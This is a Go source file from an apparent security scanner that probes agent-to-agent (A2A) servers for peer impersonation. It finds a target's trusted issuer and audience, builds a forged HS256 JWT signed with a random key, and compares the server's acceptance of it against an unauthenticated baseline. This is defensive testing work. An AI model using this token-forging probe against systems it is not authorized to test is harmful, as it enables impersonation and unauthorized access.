package a2a

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/calbebop/batesian/internal/attack"
	protoa2a "github.com/calbebop/batesian/internal/protocol/a2a"
)

// PeerImpersonationExecutor tests whether an A2A server validates the
// cryptographic signature of incoming bearer JWTs when accepting peer
// agent requests (rule a2a-peer-impersonation-001).
//
// Attack sequence:
//  1. Fetch /.well-known/agent-card.json to extract the agent name for use as
//     the JWT subject. Falls back to "trusted-orchestrator" if unavailable.
//  2. Discover the issuer and audience the target actually trusts, and build a
//     forged HS256 JWT carrying them, signed with a random key the server cannot
//     know. Claims: sub=<agent-name>, iss=<discovered>, role=orchestrator,
//     aud=<discovered>.
//  3. Send a SendMessage request with the forged token in Authorization: Bearer.
//  4. Send a baseline SendMessage with no Authorization header.
//  5. Compare: forged accepted + baseline rejected => server trusts claims
//     without signature verification; both accepted => no auth enforced.
//
// The issuer must be discovered rather than invented. This rule asks one
// question: does the server verify the signature? A server that checks the
// issuer against an allowlist before (or instead of) verifying the signature
// answers a token bearing an unknown issuer with a 401, which is
// indistinguishable from a server that verified the signature and found it
// invalid. Issuer allowlisting is ordinary practice, so a fabricated issuer made
// this rule report those servers clean. Measured against a server that trusts a
// published issuer and never verifies signatures: reported clean with a
// fabricated issuer, HIGH with the real one, same server both times.
//
// When no issuer can be discovered and the forged probe is refused, the rule
// says so rather than reporting clean, because the refusal cannot be attributed
// to signature verification.
type PeerImpersonationExecutor struct {
	rule attack.RuleContext
}

// NewPeerImpersonationExecutor creates an executor for the a2a-peer-impersonation attack type.
func init() {
	attack.Register("a2a-peer-impersonation", func(rc attack.RuleContext) attack.Executor { return NewPeerImpersonationExecutor(rc) })
}

func NewPeerImpersonationExecutor(r attack.RuleContext) *PeerImpersonationExecutor {
	return &PeerImpersonationExecutor{rule: r}
}

func (e *PeerImpersonationExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	// Two clients: one with any configured token for card fetching, and one
	// explicitly without for the unauthenticated baseline probe (step 4).
	client := attack.NewHTTPClient(opts, vars)
	unauthClient := attack.NewUnauthHTTPClient(opts, vars)

	endpoint, ok := resolveA2AEndpoint(ctx, unauthClient, vars.BaseURL)
	if !ok {
		return nil, attack.ErrInconclusive
	}

	// Step 1: Probe the agent card for a plausible agent name to impersonate, and
	// keep the parsed card: its security schemes are where the trusted issuer is
	// published, and its service URL is the audience the server expects.
	agentName := "trusted-orchestrator"
	var card *protoa2a.AgentCard
	if body, ok := fetchAgentCardBody(ctx, client, vars.BaseURL); ok {
		var parsed protoa2a.AgentCard
		if json.Unmarshal(body, &parsed) == nil {
			card = &parsed
			if parsed.Name != "" {
				agentName = parsed.Name
			}
		}
	}

	// Step 2: Build the forged JWT using a random signing key, carrying the issuer
	// and audience the target actually trusts.
	claims := deriveForgedClaims(ctx, client, vars.BaseURL, target, card)
	forgedToken, err := buildForgedJWT(agentName, claims.iss, claims.aud)
	if err != nil {
		return nil, fmt.Errorf("building forged JWT: %w", err)
	}

	// Steps 3 and 4: on each revision the agent might speak, send the forged probe
	// and the unauthenticated baseline, and keep the first pair where the send
	// method exists. The baseline uses unauthClient so opts.Token is not injected.
	forgedResp, baselineResp, wire, ok := e.probeWires(ctx, client, unauthClient, endpoint, forgedToken, vars.RandID)
	if !ok {
		return nil, fmt.Errorf("%w: no revision's send method is implemented at %s "+
			"(tried v1.0 SendMessage and v0.3 message/send), so credential handling was never exercised",
			attack.ErrInconclusive, endpoint)
	}

	// Acceptance = a 2xx carrying a JSON-RPC result envelope (IsAccepted).
	// Rejection is anything else: a 401/403, a 4xx, OR a 200 carrying a
	// JSON-RPC error envelope (no result). The
	// only difference between the two probes is the Authorization header, so the
	// forged-vs-baseline comparison isolates credential handling regardless of
	// how the server signals rejection.
	forgedOK := forgedResp.IsAccepted()
	baselineOK := baselineResp.IsAccepted()

	var findings []attack.Finding

	switch {
	case forgedOK && !baselineOK:
		// Forged JWT accepted, but no-auth request rejected: server reads claims
		// without verifying the signature against a known key.
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "high",
			Confidence: attack.ConfirmedExploit,
			Title:      "A2A server accepted forged peer agent JWT without signature validation",
			Description: fmt.Sprintf(
				"A forged HS256 JWT (sub=%q, iss=%q, role=orchestrator) signed with a random "+
					"key was accepted by the A2A server (HTTP %d), while an unauthenticated "+
					"baseline request was rejected (HTTP %d). The server is granting access based "+
					"on JWT claims alone without verifying the token signature.",
				agentName, claims.iss,
				forgedResp.StatusCode, baselineResp.StatusCode),
			Evidence: fmt.Sprintf(
				"Forged JWT (redacted): %s...[signature omitted]\niss: %s\nissuer source: %s\naud: %s\n"+
					"wire: %s\nForged response: HTTP %d\nBaseline response: HTTP %d\n%s",
				jwtHeader(forgedToken), claims.iss, claims.source, claims.aud, wire,
				forgedResp.StatusCode, baselineResp.StatusCode,
				snippet(forgedResp.Body, 400)),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})

	case forgedOK && baselineOK:
		// Both accepted: the server does not enforce authentication at all.
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "medium",
			Confidence: attack.ConfirmedExploit,
			Title:      "A2A server accepts unauthenticated requests; peer impersonation possible",
			Description: fmt.Sprintf(
				"Both a forged JWT request (HTTP %d) and an unauthenticated baseline request "+
					"(HTTP %d) were accepted. The server does not enforce authentication, "+
					"making peer agent impersonation trivial for any caller.",
				forgedResp.StatusCode, baselineResp.StatusCode),
			Evidence: fmt.Sprintf(
				"wire: %s\nForged response: HTTP %d\nBaseline response: HTTP %d\n%s",
				wire, forgedResp.StatusCode, baselineResp.StatusCode,
				snippet(forgedResp.Body, 400)),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})

	case !forgedOK && !claims.discovered():
		// The forged token was refused, but it carried an invented issuer, so the
		// refusal is equally consistent with the server filtering unknown issuers
		// and with the server verifying the signature. Reporting clean here is the
		// false negative this rule shipped with: a server that trusts a published
		// issuer and never checks signatures looks identical from the outside.
		return nil, fmt.Errorf("%w: the target publishes no trusted issuer, so a forged token "+
			"carrying an invented issuer (%s) cannot distinguish signature verification from "+
			"issuer filtering; publish RFC 9728 protected-resource metadata or an "+
			"openIdConnect/oauth2 securityScheme in the agent card to make this testable",
			attack.ErrInconclusive, claims.iss)
	}

	return findings, nil
}

// impersonationWire is one revision's send request, in the shape that revision
// defines.
type impersonationWire struct {
	name    string
	headers map[string]string
	body    map[string]interface{}
}

// impersonationWires lists the send methods to try, newest first.
//
// The rule sent only v1.0 SendMessage and had no fallback, alone among the A2A
// rules. A v0.3 agent answers that with -32601 at HTTP 200 for BOTH the forged and
// the baseline probe, so neither was accepted, no switch case matched, and the rule
// returned clean: a server that trusts a published issuer and never verifies a
// signature was reported secure because the scanner spoke the wrong revision at it.
// The rejection it saw came from the dispatcher, not the auth layer.
func impersonationWires(randID string) []impersonationWire {
	return []impersonationWire{
		{
			name:    "v1.0 SendMessage",
			headers: map[string]string{"A2A-Version": "1.0"},
			body: jsonRPCCall("SendMessage", map[string]interface{}{
				"message": map[string]interface{}{
					"messageId": "batesian-pi-" + randID,
					"role":      "ROLE_USER",
					"parts":     []interface{}{map[string]interface{}{"text": "ping"}},
				},
			}),
		},
		{
			// v0.3: slash method, lowercase role, and parts carry a kind. messageId
			// is required by the Message schema, which the previous body omitted.
			name: "v0.3 message/send",
			body: jsonRPCCall("message/send", map[string]interface{}{
				"message": map[string]interface{}{
					"messageId": "batesian-pi-" + randID,
					"role":      "user",
					"parts":     []interface{}{map[string]interface{}{"kind": "text", "text": "ping"}},
				},
			}),
		},
	}
}

// probeWires sends the forged and baseline probes on each revision and returns the
// first pair where the method exists. A revision answering -32601 to both is not
// implemented here and says nothing about credential handling.
func (e *PeerImpersonationExecutor) probeWires(ctx context.Context, client, unauthClient *attack.HTTPClient,
	endpoint, forgedToken, randID string) (forged, baseline *attack.Response, wire string, ok bool) {
	for _, w := range impersonationWires(randID) {
		forgedHeaders := map[string]string{"Authorization": "Bearer " + forgedToken}
		for k, v := range w.headers {
			forgedHeaders[k] = v
		}
		fResp, err := client.POST(ctx, endpoint, forgedHeaders, w.body)
		if err != nil {
			continue
		}
		bResp, err := unauthClient.POST(ctx, endpoint, w.headers, w.body)
		if err != nil {
			continue
		}
		if methodAbsent(fResp) && methodAbsent(bResp) {
			continue
		}
		return fResp, bResp, w.name, true
	}
	return nil, nil, "", false
}

// methodAbsent reports whether a response is a -32601, which real SDKs return at
// HTTP 200 for a method name the revision does not define.
func methodAbsent(resp *attack.Response) bool {
	code, ok := jsonRPCErrorCode(resp.Body)
	return ok && code == methodNotFound
}

// fallbackForgedIssuer is used only when the target publishes no issuer anywhere.
// A token carrying it proves nothing about signature verification on a server
// that filters issuers, which is why discovery is attempted first and why a
// refusal under this fallback is reported as inconclusive.
const fallbackForgedIssuer = "https://legitimate-orchestrator.example.com"

// forgedClaims are the issuer and audience the forged token will carry, and
// whether they came from the target or had to be invented.
type forgedClaims struct {
	iss    string
	aud    string
	source string // where iss came from, for the finding's evidence
}

// discovered reports whether the issuer came from the target rather than being
// fabricated, which is what makes a refusal meaningful.
func (c forgedClaims) discovered() bool { return c.iss != fallbackForgedIssuer }

// deriveForgedClaims finds the issuer and audience the target actually trusts.
//
// Two sources, in order of authority:
//  1. RFC 9728 protected-resource metadata, which names the authorization
//     servers and the canonical resource identifier outright.
//  2. The agent card's security schemes: an openIdConnect scheme's issuer is its
//     configuration URL minus the well-known suffix, and an OAuth2 flow's issuer
//     is the origin of its authorization or token endpoint.
//
// The audience falls back to the card's service URL and then to the target,
// since an audience mismatch confounds the probe the same way an issuer
// mismatch does.
func deriveForgedClaims(ctx context.Context, client *attack.HTTPClient, baseURL, target string, card *protoa2a.AgentCard) forgedClaims {
	out := forgedClaims{iss: fallbackForgedIssuer, aud: target, source: "fabricated (target published no issuer)"}

	if card != nil {
		if u := card.GetServiceURL(); u != "" {
			out.aud = u
		}
	}

	// Source 1: protected-resource metadata.
	if resp, err := client.GET(ctx, baseURL+"/.well-known/oauth-protected-resource", nil); err == nil && resp.IsSuccess() {
		var meta struct {
			Resource             string   `json:"resource"`
			AuthorizationServers []string `json:"authorization_servers"`
		}
		if json.Unmarshal(resp.Body, &meta) == nil {
			if len(meta.AuthorizationServers) > 0 && meta.AuthorizationServers[0] != "" {
				out.iss = strings.TrimSuffix(meta.AuthorizationServers[0], "/")
				out.source = "protected-resource metadata (authorization_servers)"
			}
			if meta.Resource != "" {
				out.aud = meta.Resource
			}
			if out.discovered() {
				return out
			}
		}
	}

	// Source 2: the agent card's security schemes.
	if card == nil {
		return out
	}
	// Sorted, not map order. Go randomizes map iteration, and both the forged
	// token's iss and this evidence string come from whichever scheme is seen
	// first, so a card declaring two issuer-bearing schemes (an openIdConnect and
	// an oauth2 at different IdPs, normal during a migration) produced a different
	// issuer per run. Measured on such a card: two distinct issuers across 30 runs,
	// 25 to 5. Against an issuer-filtering server that decides whether the rule
	// fires at all. oauthFlowEndpoints below was already sorted for this reason;
	// the walk enclosing it was not.
	names := make([]string, 0, len(card.SecuritySchemes))
	for name := range card.SecuritySchemes {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		if iss := issuerFromScheme(card.SecuritySchemes[name]); iss != "" {
			out.iss = iss
			out.source = fmt.Sprintf("agent card securityScheme %q", name)
			return out
		}
	}
	return out
}

// issuerFromScheme extracts an issuer from one declared security scheme, or ""
// when the scheme carries no issuer (an apiKey or plain bearer scheme does not).
func issuerFromScheme(s protoa2a.SecurityScheme) string {
	if s.OpenIDConnect != nil && s.OpenIDConnect.OpenIDConnectURL != "" {
		u := s.OpenIDConnect.OpenIDConnectURL
		// An OIDC issuer is its configuration URL without the well-known suffix.
		u = strings.TrimSuffix(u, "/.well-known/openid-configuration")
		return strings.TrimSuffix(u, "/")
	}
	if s.OAuth2 != nil {
		for _, endpoint := range oauthFlowEndpoints(s.OAuth2.Flows) {
			if origin := urlOrigin(endpoint); origin != "" {
				return origin
			}
		}
	}
	return ""
}

// oauthFlowEndpoints lists the authorization and token endpoints declared across
// an OAuth2 scheme's flows, in a stable order so the derived issuer does not
// depend on which flows a card happens to declare first.
func oauthFlowEndpoints(f protoa2a.OAuthFlows) []string {
	var out []string
	if f.AuthorizationCode != nil {
		out = append(out, f.AuthorizationCode.AuthorizationURL, f.AuthorizationCode.TokenURL)
	}
	if f.ClientCredentials != nil {
		out = append(out, f.ClientCredentials.TokenURL)
	}
	if f.DeviceCode != nil {
		out = append(out, f.DeviceCode.DeviceAuthorizationURL, f.DeviceCode.TokenURL)
	}
	if f.Implicit != nil {
		out = append(out, f.Implicit.AuthorizationURL)
	}
	if f.Password != nil {
		out = append(out, f.Password.TokenURL)
	}
	return out
}

// urlOrigin reduces an endpoint URL to scheme://host, which is the closest an
// OAuth2 flow URL gets to naming its issuer.
func urlOrigin(raw string) string {
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return ""
	}
	return u.Scheme + "://" + u.Host
}

// buildForgedJWT constructs a HS256 JWT signed with a random key.
// It uses only stdlib: encoding/base64, encoding/json, crypto/hmac, crypto/sha256, crypto/rand.
func buildForgedJWT(sub, iss, aud string) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{
		"alg": "HS256",
		"typ": "JWT",
	})
	if err != nil {
		return "", err
	}

	now := time.Now().Unix()
	payloadJSON, err := json.Marshal(map[string]interface{}{
		"sub":  sub,
		"iss":  iss,
		"aud":  aud,
		"role": "orchestrator",
		"iat":  now,
		"exp":  now + 3600,
	})
	if err != nil {
		return "", err
	}

	headerEnc := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadEnc := base64.RawURLEncoding.EncodeToString(payloadJSON)
	signingInput := headerEnc + "." + payloadEnc

	// Use a fresh random key -- the server cannot know it, so a valid server
	// must reject the token. A server that accepts it trusts unsigned claims.
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", fmt.Errorf("generating random JWT key: %w", err)
	}

	mac := hmac.New(sha256.New, key)
	_, _ = mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)

	return signingInput + "." + base64.RawURLEncoding.EncodeToString(sig), nil
}

// jwtHeader returns the header.payload portion of a JWT (the first two segments)
// for safe inclusion in evidence without leaking the signature or full token value.
func jwtHeader(token string) string {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) >= 2 {
		return parts[0] + "." + parts[1]
	}
	return "[invalid-token]"
}
